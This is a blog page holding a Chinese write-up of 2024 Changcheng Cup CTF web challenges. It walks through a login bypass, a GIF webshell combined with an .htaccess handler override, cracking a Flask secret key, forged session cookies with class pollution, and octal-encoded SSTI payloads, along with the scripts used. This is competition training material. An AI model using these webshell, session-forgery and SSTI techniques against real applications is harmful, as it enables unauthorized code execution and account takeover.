@@ -1,0 +1,205 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2024长城杯 | Dyinglight's blog</title><meta name="author" content="Dyinglight"><meta name="copyright" content="Dyinglight"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="2024长城杯-wp WEBsqlup先fuzz一波 过滤了–+,#,select,and ,or 输入admin 1进去了？？？（源代码的fuzzy matching实际上是用%%密码登录 点击头像有文件上传的点   过滤了字母p，导致无法上传.php文件，尝试了一下可以上传正常的gif文件 所以可以做一个gif的图片马 上传之后我们打开图片链接，就可以拿到图片的目录了 http:&#x2F;&#x2F;eci-2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024长城杯">
+<meta property="og:url" content="https://www.dyinglight.me/posts/2024%E9%95%BF%E5%9F%8E%E6%9D%AF/index.html">
+<meta property="og:site_name" content="Dyinglight&#39;s blog">
+<meta property="og:description" content="2024长城杯-wp WEBsqlup先fuzz一波 过滤了–+,#,select,and ,or 输入admin 1进去了？？？（源代码的fuzzy matching实际上是用%%密码登录 点击头像有文件上传的点   过滤了字母p，导致无法上传.php文件，尝试了一下可以上传正常的gif文件 所以可以做一个gif的图片马 上传之后我们打开图片链接，就可以拿到图片的目录了 http:&#x2F;&#x2F;eci-2">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://www.dyinglight.me/img/sly.jpg">
+<meta property="article:published_time" content="2024-09-08T01:13:32.000Z">
+<meta property="article:modified_time" content="2024-09-10T11:58:33.461Z">
+<meta property="article:author" content="Dyinglight">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://www.dyinglight.me/img/sly.jpg"><link rel="shortcut icon" href="/img/%E6%98%9F%E7%90%83.png"><link rel="canonical" href="https://www.dyinglight.me/posts/2024%E9%95%BF%E5%9F%8E%E6%9D%AF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2024长城杯',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2024-09-10 19:58:33'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/sly.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/2.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Dyinglight's blog"><span class="site-name">Dyinglight's blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2024长城杯</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-08T01:13:32.000Z" title="发表于 2024-09-08 09:13:32">2024-09-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-10T11:58:33.461Z" title="更新于 2024-09-10 19:58:33">2024-09-10</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2024长城杯"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="2024长城杯-wp"><a href="#2024长城杯-wp" class="headerlink" title="2024长城杯-wp"></a>2024长城杯-wp</h1><p><img src="/../images/%E9%95%BF%E5%9F%8E%E6%9D%AF/2.png"></p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="sqlup"><a href="#sqlup" class="headerlink" title="sqlup"></a>sqlup</h3><p>先fuzz一波</p>
+<p>过滤了–+,#,select,and ,or</p>
+<p>输入admin 1进去了？？？（源代码的fuzzy matching实际上是用%%密码登录</p>
+<p>点击头像有文件上传的点</p>
+<p><img src="/../images/ssti/7.png"></p>
+<p><img src="/../images/ssti/8.png"></p>
+<p>过滤了字母p，导致无法上传.php文件，尝试了一下可以上传正常的gif文件</p>
+<p>所以可以做一个gif的图片马</p>
+<p>上传之后我们打开图片链接，就可以拿到图片的目录了</p>
+<p><a target="_blank" rel="noopener" href="http://eci-2ze5wzpsckex64sy7i6f.cloudeci1.ichunqiu.com/uploads/2.gif">http://eci-2ze5wzpsckex64sy7i6f.cloudeci1.ichunqiu.com/uploads/2.gif</a></p>
+<p>有了图片马该如何利用呢？想到了.htaccess文件可以更改文件的解析</p>
+<p>我们上传一个.htaccess文件：SetHandler application&#x2F;x-httpd-php</p>
+<p>这样所有的文件都会当做php代码来解析</p>
+<p>(蚁剑无法打开&#x2F;flag文件，需要用tac指令显示！)</p>
+<p><img src="/../images/ssti/6.png"></p>
+<h3 id="candyshop-未解出"><a href="#candyshop-未解出" class="headerlink" title="candyshop[未解出]"></a>candyshop[未解出]</h3><p>{‘csrf_token’: ‘04d9a3ecee8267e5ce21f9377e99fd425144aa5f’, ‘identity’: ‘guest’, ‘username’: ‘admin’}</p>
+<p><img src="/../images/%E9%95%BF%E5%9F%8E%E6%9D%AF/3.png"></p>
+<p>借助flask-unsign工具可以爆破秘钥：a123456</p>
+<p><img src="/../images/%E9%95%BF%E5%9F%8E%E6%9D%AF/4.png"></p>
+<p>伪造session .eJw9y0EKgCAQAMC_7LmDW6bWZ2LVXZDQwOwQ0d_z1HVgHghnla0dOxdYwXrUhMgTolEoMzoKY2ArRhaFVntNUWknMECKXFpqd18UcyqdrpNrocw_vR9gxh1Q.ZuAMjw.b0AUOTmCQ3ZMBe1JKK3ybGqQaPc</p>
+<p><img src="/../images/%E9%95%BF%E5%9F%8E%E6%9D%AF/5.png"></p>
+<p>成功进入admin路由</p>
+<p><img src="/../images/%E9%95%BF%E5%9F%8E%E6%9D%AF/6.png"></p>
+<p>添加库存</p>
+<p>污染sold</p>
+<p><code> &quot;&#123;&#39;csrf_token&#39;: &#39;fbe216802ca261c5956c46ba90628f1eb9dc1d17&#39;, &#39;identity&#39;: &#39;admin&#39;, &#39;username&#39;: &#39;admin&#39;,&#39;__init__&#39;:&#123;&#39;__globals__&#39;:&#123;&#39;sold&#39; : 600&#125;&#125;&#125;&quot;</code></p>
+<p><code>.eJxNi0EKwyAQAP-y5x5Umm30M7LqWqRmhWgPJfj3Cr30NjMwF8R-Zj_aiwUc5MBG465MJIM6bnbDeMdAVqHZs-ZgU9RJP-AGJbGMMj7ronQUWend-RQ6-C95X6QM78Fdi5-1Bar9p73VBA6VmnN-ASCJKvw.ZuAT_g.jJdvne7R839xwsuNCPdrQZ1ZQAE</code></p>
+<p><img src="/../images/%E9%95%BF%E5%9F%8E%E6%9D%AF/7.png"></p>
+<p>Congratulations! Here is my secret: flag in &#x2F;tmp&#x2F;xxxx&#x2F;xxx&#x2F;xxxx&#x2F;flag</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">sanitize_inventory_sold</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> re.sub(<span class="string">r&#x27;[a-zA-Z_]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="built_in">str</span>(value))</span><br></pre></td></tr></table></figure>
+
+<p>发现有个waff，在view_directory路由调用</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin/view_inventory&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view_inventory</span>():</span><br><span class="line">    username = session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    identity = session.get(<span class="string">&#x27;identity&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> identity != <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">    inventory_value = sanitize_inventory_sold(inventory)</span><br><span class="line">    sold_value = sanitize_inventory_sold(sold)</span><br><span class="line">    <span class="keyword">return</span> render_template_string(<span class="string">&quot;商店库存:&quot;</span> + inventory_value + <span class="string">&quot;已售出&quot;</span> + sold_value)</span><br></pre></td></tr></table></figure>
+
+<p>猜测这个位置有ssti，也就是说要只要污染sold为ssti的payload，就能命令执行了</p>
+<p>waf非常严格，过滤了字母和下划线</p>
+<p>使用这个脚本来替换字母为八进制</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exp = <span class="string">&quot;__class__&quot;</span></span><br><span class="line">dicc = []</span><br><span class="line">exploit = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;dicc.append(&#x27;&#123;&#125;&#x27;)&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;\\&quot;</span>+<span class="built_in">str</span>(i)))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> exp:</span><br><span class="line">    exploit += <span class="string">&quot;\\\\&quot;</span>+ <span class="built_in">str</span>(dicc.index(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(exploit)</span><br></pre></td></tr></table></figure>
+
+<p>使用这个脚本对session加密</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> request</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, make_response</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;a123456&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="comment"># 设置一些 session 数据</span></span><br><span class="line">    session[<span class="string">&quot;csrf_token&quot;</span>] = <span class="string">&quot;d8ab3b9300e88f1abd2ee2d00bca39791e3d334e&quot;</span></span><br><span class="line">    session[<span class="string">&quot;__init__&quot;</span>] = &#123;<span class="string">&quot;__globals__&quot;</span>: &#123;<span class="string">&quot;sold&quot;</span>: <span class="string">&quot;&#123;&#123;()[\\137\\137\\143\\154\\141\\163\\163\\137\\137][\\137\\137\\142\\141\\163\\145\\163\\137\\137][0][\\137\\137\\163\\165\\142\\143\\154\\141\\163\\163\\145\\163\\137\\137]()&#125;&#125;&quot;</span>&#125;&#125;</span><br><span class="line">    session[<span class="string">&quot;identity&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    session[<span class="string">&quot;username&quot;</span>] = <span class="string">&quot;ad&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建响应对象</span></span><br><span class="line">    response = make_response(<span class="string">&quot;Session set.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;()[<span class="string">&#x27;__class__&#x27;</span>][<span class="string">&#x27;__bases__&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;__subclasses__&#x27;</span>]()&#125;&#125;</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.\\<span class="number">137</span>\\<span class="number">137</span>\\<span class="number">143</span>\\<span class="number">154</span>\\<span class="number">141</span>\\<span class="number">163</span>\\<span class="number">163</span>\\<span class="number">137</span>\\<span class="number">137.</span>\\<span class="number">137</span>\\<span class="number">137</span>\\<span class="number">155</span>\\<span class="number">162</span>\\<span class="number">157</span>\\<span class="number">137</span>\\<span class="number">137</span>[-<span class="number">1</span>].\\<span class="number">137</span>\\<span class="number">137</span>\\<span class="number">163</span>\\<span class="number">165</span>\\<span class="number">142</span>\\<span class="number">143</span>\\<span class="number">154</span>\\<span class="number">141</span>\\<span class="number">163</span>\\<span class="number">163</span>\\<span class="number">145</span>\\<span class="number">163</span>\\<span class="number">137</span>\\<span class="number">137</span>()&#125;&#125;</span><br><span class="line">&#123;&#123;config&#125;&#125;</span><br><span class="line">&#123;&#123;\\<span class="number">143</span>\\<span class="number">157</span>\\<span class="number">156</span>\\<span class="number">146</span>\\<span class="number">151</span>\\<span class="number">147</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>到这里复现的环境就行不通了，可能要到linux环境</p>
+<p>复现的压缩包放到夸克网盘了<br><a target="_blank" rel="noopener" href="https://pan.quark.cn/s/677a926c1edd">https://pan.quark.cn/s/677a926c1edd</a></p>
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="BrickGame"><a href="#BrickGame" class="headerlink" title="BrickGame"></a>BrickGame</h3><p>记住图标后选择相同图标格子即可</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://www.dyinglight.me">Dyinglight</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://www.dyinglight.me/posts/2024%E9%95%BF%E5%9F%8E%E6%9D%AF/">https://www.dyinglight.me/posts/2024%E9%95%BF%E5%9F%8E%E6%9D%AF/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://www.dyinglight.me" target="_blank">Dyinglight's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/img/sly.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/BaseCTF-web-wp/" title="'BaseCTF-web-wp'"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">'BaseCTF-web-wp'</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/sly.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Dyinglight</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">24</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Dyinglight5"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2024%E9%95%BF%E5%9F%8E%E6%9D%AF-wp"><span class="toc-number">1.</span> <span class="toc-text">2024长城杯-wp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">1.1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sqlup"><span class="toc-number">1.1.1.</span> <span class="toc-text">sqlup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#candyshop-%E6%9C%AA%E8%A7%A3%E5%87%BA"><span class="toc-number">1.1.2.</span> <span class="toc-text">candyshop[未解出]</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISC"><span class="toc-number">1.2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#BrickGame"><span class="toc-number">1.2.1.</span> <span class="toc-text">BrickGame</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/2024%E9%95%BF%E5%9F%8E%E6%9D%AF/" title="2024长城杯">2024长城杯</a><time datetime="2024-09-08T01:13:32.000Z" title="发表于 2024-09-08 09:13:32">2024-09-08</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/BaseCTF-web-wp/" title="'BaseCTF-web-wp'">'BaseCTF-web-wp'</a><time datetime="2024-08-26T08:28:12.000Z" title="发表于 2024-08-26 16:28:12">2024-08-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/ssti/" title="'ssti'">'ssti'</a><time datetime="2024-08-26T05:57:21.000Z" title="发表于 2024-08-26 13:57:21">2024-08-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/hello-world/" title="Hello World">Hello World</a><time datetime="2024-07-23T10:28:37.049Z" title="发表于 2024-07-23 18:28:37">2024-07-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/ssrf%E6%BC%8F%E6%B4%9E/" title="ssrf漏洞">ssrf漏洞</a><time datetime="2024-07-21T02:41:28.000Z" title="发表于 2024-07-21 10:41:28">2024-07-21</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Dyinglight</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="false"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
